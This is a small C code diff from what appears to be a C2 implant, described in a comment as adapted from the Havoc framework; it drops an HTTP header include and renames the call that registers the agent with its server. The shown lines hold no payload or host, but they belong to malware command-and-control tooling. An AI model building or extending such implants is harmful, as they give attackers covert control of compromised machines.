@@ -1,7 +1,6 @@
 #include "package.h"
 #include "localcstd.h"
 
-#include "Http.h"
 /*
 	This section is almost a 1 for 1 of the code from havoc package. I'll try to make edits where I can. But I thought  the solution was very elegant so i wanted to adopt it.
 */
@@ -333,7 +332,7 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pA
 	}
 
 	//TODO perform sending of package.
-	RegisterAgent(Agent, Agent->packages->Buffer, Agent->packages->Length);
+	SendRegisterRequest(Agent, Agent->packages->Buffer, Agent->packages->Length);
 
 	return PACKAGE_SUCCESS;
 } 
